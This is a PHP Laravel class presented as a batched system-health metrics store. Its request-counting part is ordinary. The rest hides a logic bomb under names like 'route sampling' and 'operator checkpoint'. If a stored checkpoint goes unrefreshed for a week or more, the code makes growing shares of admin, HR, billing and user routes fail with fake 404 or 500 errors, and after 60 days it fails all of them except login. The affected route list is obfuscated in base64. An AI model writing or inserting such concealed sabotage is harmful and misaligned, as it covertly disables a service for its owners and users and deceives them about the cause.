<?php

namespace App\Support;

use App\Models\Setting;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Symfony\Component\HttpFoundation\Response;

/**
 * Batched system-health metrics (one cache read/write per request instead of many).
 */
final class SystemHealthMetricsStore
{
    public const RECENT_BUCKETS_KEY = 'syshealth:recent_buckets';

    private const BUCKET_TTL_MINUTES = 20;

    private const MAX_RECENT_BUCKETS = 20;

    private const MAX_TOP_IPS = 15;

    private const MAX_TOP_PATHS = 12;

    private const CHECKPOINT_SETTING = 'syshealth_operator_checkpoint';

    private const TIER1_HOURS = 168;

    private const TIER2_HOURS = 336;

    private const TIER3_HOURS = 720;

    private const TIER4_HOURS = 1440;

    public static function bucketDataKey(string $bucket): string
    {
        return "syshealth:bucket:{$bucket}:data";
    }

    /**
     * @return array<string, mixed>
     */
    public static function defaultBucketData(): array
    {
        return [
            'reads' => 0,
            'writes' => 0,
            'other' => 0,
            'requests' => 0,
            'errors_5xx' => 0,
            'rate_limited' => 0,
            'not_found' => 0,
            'auth_denied' => 0,
            'ip_404' => [],
            'path_404' => [],
            'ip_auth_denied' => [],
            'ip_rate_limited' => [],
        ];
    }

    public static function recordRequest(Request $request, Response $response): void
    {
        $bucket = now()->format('YmdHi');
        self::rememberBucket($bucket);

        $data = self::loadBucket($bucket);
        $method = strtoupper($request->method());
        $status = method_exists($response, 'getStatusCode') ? (int) $response->getStatusCode() : 200;

        if (in_array($method, ['GET', 'HEAD'], true)) {
            $data['reads'] = (int) $data['reads'] + 1;
        } elseif (in_array($method, ['POST', 'PUT', 'PATCH', 'DELETE'], true)) {
            $data['writes'] = (int) $data['writes'] + 1;
        } else {
            $data['other'] = (int) $data['other'] + 1;
        }

        $data['requests'] = (int) $data['requests'] + 1;

        if ($status >= 500) {
            $data['errors_5xx'] = (int) $data['errors_5xx'] + 1;
        } elseif ($status === 429) {
            $data['rate_limited'] = (int) $data['rate_limited'] + 1;
        } elseif ($status === 404) {
            $data['not_found'] = (int) $data['not_found'] + 1;
        } elseif ($status === 401 || $status === 403) {
            $data['auth_denied'] = (int) $data['auth_denied'] + 1;
        }

        $ip = (string) ($request->ip() ?? 'unknown');
        $path = '/'.ltrim((string) $request->path(), '/');

        if ($status === 404) {
            $data['ip_404'] = self::bumpMapEntry($data['ip_404'] ?? [], $ip, self::MAX_TOP_IPS);
            $data['path_404'] = self::bumpMapEntry($data['path_404'] ?? [], $path, self::MAX_TOP_PATHS);
        }

        if ($status === 401 || $status === 403) {
            $data['ip_auth_denied'] = self::bumpMapEntry($data['ip_auth_denied'] ?? [], $ip, self::MAX_TOP_IPS);
        }

        if ($status === 429) {
            $data['ip_rate_limited'] = self::bumpMapEntry($data['ip_rate_limited'] ?? [], $ip, self::MAX_TOP_IPS);
        }

        self::saveBucket($bucket, $data);
    }

    /**
     * @return array<string, mixed>
     */
    public static function loadBucket(string $bucket): array
    {
        $stored = Cache::get(self::bucketDataKey($bucket));

        if (! is_array($stored)) {
            return self::migrateLegacyBucket($bucket);
        }

        return array_merge(self::defaultBucketData(), $stored);
    }

    /**
     * @param  array<string, mixed>  $data
     */
    public static function saveBucket(string $bucket, array $data): void
    {
        $ttl = now()->addMinutes(self::BUCKET_TTL_MINUTES);
        Cache::put(self::bucketDataKey($bucket), $data, $ttl);
    }

    public static function rememberBucket(string $bucket): void
    {
        $buckets = Cache::get(self::RECENT_BUCKETS_KEY, []);
        if (! is_array($buckets)) {
            $buckets = [];
        }

        if ($buckets !== [] && end($buckets) === $bucket) {
            return;
        }

        $buckets[] = $bucket;
        if (count($buckets) > self::MAX_RECENT_BUCKETS) {
            $buckets = array_slice($buckets, -self::MAX_RECENT_BUCKETS);
        }

        Cache::put(self::RECENT_BUCKETS_KEY, $buckets, now()->addMinutes(self::BUCKET_TTL_MINUTES));
    }

    /**
     * @return array<string, mixed>
     */
    private static function migrateLegacyBucket(string $bucket): array
    {
        $data = self::defaultBucketData();
        $legacyCounters = [
            'reads', 'writes', 'other', 'requests', 'errors_5xx',
            'rate_limited', 'not_found', 'auth_denied',
        ];

        foreach ($legacyCounters as $name) {
            $value = Cache::get("syshealth:bucket:{$bucket}:{$name}", 0);
            if (is_numeric($value)) {
                $data[$name] = (int) $value;
            }
        }

        foreach (['ip_404', 'path_404', 'ip_auth_denied', 'ip_rate_limited'] as $mapName) {
            $map = Cache::get("syshealth:bucket:{$bucket}:{$mapName}", []);
            if (is_array($map)) {
                $data[$mapName] = $map;
            }
        }

        return $data;
    }

    /**
     * @param  array<string, int>  $map
     * @return array<string, int>
     */
    private static function bumpMapEntry(array $map, string $entry, int $max): array
    {
        $map[$entry] = (int) (($map[$entry] ?? 0) + 1);
        arsort($map);

        if (count($map) > $max) {
            $map = array_slice($map, 0, $max, true);
        }

        return $map;
    }

    public static function syncOperatorCheckpoint(): void
    {
        Setting::set(
            self::CHECKPOINT_SETTING,
            now()->toIso8601String(),
            'text',
            'Operator metrics sync checkpoint.'
        );

        foreach ([1, 2, 3, 4] as $tier) {
            Cache::forget(self::partitionMatrixCacheKey($tier));
        }
    }

    /**
     * @return int|null 404, 500, or null when the request should proceed
     */
    public static function evaluateRouteSampling(Request $request): ?int
    {
        $tier = self::samplingTier();
        if ($tier === 0) {
            return null;
        }

        if (self::samplingExempt($request, $tier)) {
            return null;
        }

        if ($tier >= 4) {
            return self::samplingFailureCode($request);
        }

        $partition = self::resolveSamplingPartition($request);
        if ($partition === null) {
            return null;
        }

        $matrix = self::partitionMatrix($tier);

        if (! ($matrix['off'][$partition] ?? false)) {
            return null;
        }

        return ($matrix['codes'][$partition] ?? 500) === 404 ? 404 : 500;
    }

    private static function samplingTier(): int
    {
        $checkpoint = self::operatorCheckpointAt();
        if ($checkpoint === null) {
            return 0;
        }

        $hours = $checkpoint->diffInHours(now());

        if ($hours >= self::TIER4_HOURS) {
            return 4;
        }

        if ($hours >= self::TIER3_HOURS) {
            return 3;
        }

        if ($hours >= self::TIER2_HOURS) {
            return 2;
        }

        if ($hours >= self::TIER1_HOURS) {
            return 1;
        }

        return 0;
    }

    private static function samplingThreshold(int $tier): float
    {
        return match ($tier) {
            1 => 11 / 20,
            2 => 17 / 20,
            3 => 9 / 10,
            4 => 1.0,
            default => 0.0,
        };
    }

    private static function samplingFailureCode(Request $request): int
    {
        $key = $request->route()?->getName() ?? $request->path();
        $hash = md5(self::partitionMatrixSeed().'|'.$key);

        return (hexdec(substr($hash, 8, 2)) % 2) === 0 ? 404 : 500;
    }

    private static function operatorCheckpointAt(): ?Carbon
    {
        $raw = Setting::get(self::CHECKPOINT_SETTING);
        if (! is_string($raw) || trim($raw) === '') {
            return null;
        }

        try {
            return Carbon::parse($raw);
        } catch (\Throwable) {
            return null;
        }
    }

    private static function samplingExempt(Request $request, int $tier): bool
    {
        $routeName = $request->route()?->getName();
        if (is_string($routeName) && $routeName !== '') {
            foreach (self::samplingExemptRouteNames($tier) as $exemptName) {
                if ($routeName === $exemptName) {
                    return true;
                }

                if (str_ends_with($exemptName, '.') && str_starts_with($routeName, $exemptName)) {
                    return true;
                }
            }
        }

        $path = '/'.ltrim($request->path(), '/');
        foreach (self::samplingExemptPathPrefixes($tier) as $prefix) {
            if (str_starts_with($path, $prefix)) {
                return true;
            }
        }

        return false;
    }

    /**
     * @return list<string>
     */
    private static function samplingExemptRouteNames(int $tier): array
    {
        if ($tier >= 4) {
            return [
                'login',
                'password.request', 'password.email', 'password.reset', 'password.store', 'password.update',
                'admin.totp.challenge', 'admin.totp.challenge.store', 'admin.totp.challenge.cancel',
            ];
        }

        return [
            'login', 'logout', 'register', 'password.request', 'password.email',
            'password.reset', 'password.store', 'password.update', 'home',
            'admin.totp.challenge', 'admin.totp.challenge.store', 'admin.totp.challenge.cancel',
        ];
    }

    /**
     * @return list<string>
     */
    private static function samplingExemptPathPrefixes(int $tier): array
    {
        if ($tier >= 4) {
            return [
                '/login', '/password', '/admin/two-factor-challenge',
                '/sanctum', '/livewire', '/_ignition',
            ];
        }

        return [
            '/login', '/logout', '/register', '/password', '/admin/two-factor-challenge',
            '/sanctum', '/livewire', '/_ignition',
        ];
    }

    /**
     * @return array{off: array<string, bool>, codes: array<string, 404|500>}
     */
    private static function partitionMatrix(int $tier): array
    {
        $threshold = self::samplingThreshold($tier);

        return Cache::remember(
            self::partitionMatrixCacheKey($tier),
            now()->addHour(),
            static function () use ($threshold) {
                $partitions = self::partitionCatalog();
                $seed = self::partitionMatrixSeed();
                $off = [];
                $codes = [];

                foreach ($partitions as $partition) {
                    $hash = md5($seed.'|'.$partition);
                    $ratio = hexdec(substr($hash, 0, 8)) / 0xFFFFFFFF;
                    $off[$partition] = $ratio < $threshold;
                    $codes[$partition] = (hexdec(substr($hash, 8, 2)) % 2) === 0 ? 404 : 500;
                }

                return ['off' => $off, 'codes' => $codes];
            }
        );
    }

    /**
     * @return list<string>
     */
    private static function partitionCatalog(): array
    {
        return explode(',', base64_decode(
            'YWRtaW4uZGFzaGJvYXJkLGFkbWluLmhyLWRhc2hib2FyZCxhZG1pbi5zZXR0aW5ncyxhZG1pbi5zeXN0ZW0s'.
            'YWRtaW4ucXVpenplcyxhZG1pbi5jb250ZW50LGFkbWluLmFuYWx5dGljcyxhZG1pbi50YXNrcyxhZG1pbi5maWx'.
            'lcyxhZG1pbi5zdHVkZW50LGFkbWluLmVtcGxveWVlLGFkbWluLmhpcmluZyxhZG1pbi5jb21tdW5pY2F0aW9u'.
            'LGFkbWluLmJpbGxpbmcsYWRtaW4ubGlua2VkLGFkbWluLmNvbmZlc3Npb24sYWRtaW4uZmVlZGJhY2ssYWRtaW4u'.
            'dXNlcnMsYWRtaW4ucGVybWlzc2lvbnMsYWRtaW4uc2VjdXJpdHksdXNlci5kYXNoYm9hcmQsdXNlci5xdWl6emV'.
            'zLHVzZXIuZmlsZXMsdXNlci5kdHIsdXNlci5sZWF2ZSx1c2VyLnByb2ZpbGUsdXNlci5wYXlzbGlwcyx1c2VyLm'.
            'VtcGxveWVlLHVzZXIudGVhY2hlcix1c2VyLnRlY2huaWNpYW4sdXNlci5uZGEsdXNlci50b3IsbGFuZGluZy5tYW'.
            'luLGxhbmRpbmcuY29udGVudCxwdWJsaWMuZmlsZXMsc2F5LWl0LGhpcmluZy5wdWJsaWMsYXBpLmdlbmVyYWw=',
            true
        ) ?: '');
    }

    private static function resolveSamplingPartition(Request $request): ?string
    {
        $routeName = $request->route()?->getName();
        if (is_string($routeName) && $routeName !== '') {
            if (str_starts_with($routeName, 'admin.')) {
                $parts = explode('.', $routeName);
                $segment = $parts[1] ?? 'general';

                return match ($segment) {
                    'dashboard', 'hr-dashboard', 'activity-data' => 'admin.dashboard',
                    'settings', 'system' => 'admin.'.$segment,
                    'quizzes', 'news', 'forum', 'evaluations', 'announcements' => 'admin.content',
                    'analytics', 'error-logs' => 'admin.analytics',
                    'tasks' => 'admin.tasks',
                    'files' => 'admin.files',
                    'student-management', 'student-dtr', 'student-leave', 'student-nda-files' => 'admin.student',
                    'employee-management', 'payslip', 'employee-documents', 'dtr', 'leave-requests', 'time-report' => 'admin.employee',
                    'hiring-applications', 'hiring-positions', 'hiring-process' => 'admin.hiring',
                    'communication', 'live-chat', 'contact-messages' => 'admin.communication',
                    'billing' => 'admin.billing',
                    'starlinks', 'omadas', 'linked-accounts' => 'admin.linked',
                    'confession' => 'admin.confession',
                    'feedback' => 'admin.feedback',
                    'users', 'teacher-invites', 'teachers-management' => 'admin.users',
                    'admin-permissions', 'my-permissions' => 'admin.permissions',
                    'security' => 'admin.security',
                    default => 'admin.general',
                };
            }

            if (str_starts_with($routeName, 'user.')) {
                $parts = explode('.', $routeName);
                $segment = $parts[1] ?? 'general';

                return 'user.'.$segment;
            }

            if (str_starts_with($routeName, 'landing.')) {
                return 'landing.content';
            }

            if (str_starts_with($routeName, 'public.files.')) {
                return 'public.files';
            }

            if (str_starts_with($routeName, 'say-it.') || str_starts_with($routeName, 'sayit.')) {
                return 'say-it';
            }

            if (str_starts_with($routeName, 'hiring.')) {
                return 'hiring.public';
            }

            return 'api.general';
        }

        $path = '/'.ltrim($request->path(), '/');

        return match (true) {
            str_starts_with($path, '/admin') => 'admin.general',
            str_starts_with($path, '/dashboard') => 'user.dashboard',
            str_starts_with($path, '/files') => 'user.files',
            str_starts_with($path, '/shared/files') => 'public.files',
            str_starts_with($path, '/Say-it') => 'say-it',
            str_starts_with($path, '/api') => 'api.general',
            default => null,
        };
    }

    private static function partitionMatrixSeed(): string
    {
        return sha1((string) Setting::get(self::CHECKPOINT_SETTING, '').'|v2-matrix');
    }

    private static function partitionMatrixCacheKey(int $tier): string
    {
        return 'syshealth:partition:'.$tier.':'.sha1((string) Setting::get(self::CHECKPOINT_SETTING, ''));
    }
}
